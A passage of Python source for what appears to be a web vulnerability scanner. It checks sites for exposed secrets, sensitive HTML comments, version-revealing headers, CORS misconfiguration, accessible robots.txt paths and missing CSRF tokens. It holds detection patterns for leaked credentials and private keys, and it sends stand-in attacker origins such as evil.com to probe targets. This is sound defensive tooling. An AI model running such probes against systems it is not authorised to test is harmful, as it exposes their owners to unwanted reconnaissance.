                "PHP info page exposed",
            r"(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)":
                "AWS credentials found in response",
            r"(-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----)":
                "Private key found in response",
        }
        for pattern, desc in checks.items():
            if re.search(pattern, resp.text, re.IGNORECASE):
                findings.append(self._f(
                    "WEB-014", "exposed_secret",
                    "Information disclosure", desc, "medium", 5.3,
                    evidence=re.search(pattern, resp.text, re.IGNORECASE).group(0)[:200],
                ))
        comment_re = re.compile(r"<!--(.*?)-->", re.DOTALL)
        for match in comment_re.finditer(resp.text):
            comment = match.group(1).strip()
            if len(comment) < 5:
                continue
            sensitive_patterns = [
                (r"(?:password|passwd|pwd)\s*[:=]", "Password found in HTML comment"),
                (r"(?:api[_-]?key|apikey|secret[_-]?key)\s*[:=]", "API key found in HTML comment"),
                (r"(?:token|auth|session)\s*[:=]", "Auth token found in HTML comment"),
                (r"TODO|FIXME|HACK|BUG|XXX", "Developer note in HTML comment (info leak)"),
                (r"(?:internal|staging|dev(?:elopment)?)\s*(?:url|server|host|api)\s*[:=]", "Internal URL in HTML comment"),
            ]
            for pat, desc in sensitive_patterns:
                if re.search(pat, comment, re.IGNORECASE):
                    findings.append(self._f(
                        "WEB-014", "info_disclosure",
                        f"Sensitive HTML comment: {desc}",
                        f"HTML comment contains potentially sensitive information.",
                        "low", 3.7,
                        evidence=f"Comment: {comment[:300]}",
                    ))
                    break
        return findings


    def _check_technology_disclosure(self, resp: requests.Response) -> list[dict]:
        findings = []
        disclosure_headers = {
            "Server": "Web server version disclosed",
            "X-Powered-By": "Application framework disclosed",
            "X-AspNet-Version": "ASP.NET version disclosed",
            "X-AspNetMvc-Version": "ASP.NET MVC version disclosed",
            "X-Generator": "Site generator disclosed",
        }
        for header_name, desc in disclosure_headers.items():
            value = resp.headers.get(header_name, "")
            if value:
                if re.search(r"\d+\.\d+|php|apache|nginx|iis|express|tomcat|jetty|django|rails|asp\.net", value, re.IGNORECASE):
                    findings.append(self._f(
                        "WEB-014", "info_disclosure",
                        f"Technology disclosure: {header_name}: {value}",
                        f"{desc} via {header_name} header. Attackers can search for known CVEs for this specific version.",
                        "low", 3.7,
                        url=resp.url,
                        evidence=f"{header_name}: {value}",
                    ))
        return findings


    def _check_cors(self, base_url: str) -> list[dict]:
        findings = []
        evil_origins = [
            "https://evil.com",
            f"https://{urlparse(base_url).hostname}.evil.com",
            "null",
        ]
        for origin in evil_origins:
            try:
                resp = self.session.get(
                    base_url, timeout=self.timeout,
                    headers={"Origin": origin},
                )
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

                if acao == origin and acac == "true":
                    findings.append(self._f(
                        "WEB-017", "cors",
                        f"CORS credential theft — reflects {origin}",
                        f"Server reflects attacker origin '{origin}' with credentials enabled. "
                        "Any website can steal authenticated user data.",
                        "high", 8.1, url=base_url,
                        evidence=(
                            f"Request Origin: {origin}\n"
                            f"Access-Control-Allow-Origin: {acao}\n"
                            f"Access-Control-Allow-Credentials: {acac}"
                        ),
                    ))
                    break

                elif acao == origin:
                    findings.append(self._f(
                        "WEB-017", "cors",
                        f"CORS origin reflection — reflects {origin}",
                        f"Server reflects attacker origin '{origin}'. Cross-origin requests allowed from any domain.",
                        "medium", 5.3, url=base_url,
                        evidence=(
                            f"Request Origin: {origin}\n"
                            f"Access-Control-Allow-Origin: {acao}"
                        ),
                    ))
                    break

            except RequestException:
                pass
        return findings


    def _check_robots_txt(self, base_url: str) -> list[dict]:
        findings = []
        robots_url = base_url.rstrip("/") + "/robots.txt"
        try:
            resp = self.session.get(robots_url, timeout=self.timeout)
            if resp.status_code != 200 or "disallow" not in resp.text.lower():
                return []
            if self._is_block_or_error_page(resp.text, len(resp.content)):
                return []
        except RequestException:
            return []

        sensitive_keywords = [
            "admin", "backup", "config", "secret", "private", "internal",
            "api", "debug", "test", "staging", "dev", "cgi-bin", "tmp",
            "upload", "database", "phpmyadmin", "wp-admin", "login",
        ]
        for line in resp.text.splitlines():
            line = line.strip()
            if not line.lower().startswith("disallow:"):
                continue
            path = line.split(":", 1)[1].strip()
            if not path or path == "/":
                continue
            path_lower = path.lower()
            if not any(kw in path_lower for kw in sensitive_keywords):
                continue
            check_url = base_url.rstrip("/") + path
            try:
                check_resp = self.session.get(check_url, timeout=self.timeout, allow_redirects=False)
                if check_resp.status_code in (200, 206):
                    body = check_resp.text
                    if self._is_block_or_error_page(body, len(check_resp.content)):
                        continue
                    if len(check_resp.content) < 10:
                        continue
                    findings.append(self._f(
                        "WEB-011", "exposed_file",
                        f"robots.txt disallowed path accessible: {path}",
                        f"Path {path} is marked Disallow in robots.txt but returns HTTP {check_resp.status_code} "
                        f"with {len(check_resp.content)} bytes of content.",
                        "medium", 5.3, url=check_url,
                        evidence=f"robots.txt Disallow: {path}\nHTTP {check_resp.status_code} — {len(check_resp.content)} bytes.\nContent: {body[:200]}",
                    ))
            except RequestException:
                pass
        return findings

    def _check_csrf(self, resp: requests.Response) -> list[dict]:
        form_re = re.compile(
            r"<form[^>]*method=['\"]?post[^>]*>(.*?)</form>",
            re.IGNORECASE | re.DOTALL,
        )
        csrf_re = re.compile(
            r'<input[^>]*name=["\']?[^"\']*(?:csrf|token|_token|csrfmiddlewaretoken)',
            re.IGNORECASE,
        )
        for match in form_re.finditer(resp.text):
            if not csrf_re.search(match.group(1)):
                return [self._f(
                    "WEB-009", "csrf",
                    "POST form missing CSRF token",
                    "A POST form without an anti-CSRF token was found on the root page.",
                    "medium", 6.5,
                )]
        return []


    def _f(
        self,
        vuln_id: str, category: str, title: str,
        description: str, severity: str, cvss_score: float,
        **extra: Any,
    ) -> dict[str, Any]:
        d = {
            "vuln_id": vuln_id, "category": category, "title": title,
            "description": description, "severity": severity, "cvss_score": cvss_score,
            "scanner": "WebScanner",
            "request": getattr(self.session, 'last_request', None),
            "response": getattr(self.session, 'last_response', None),
        }
        d.update(extra)
        return d
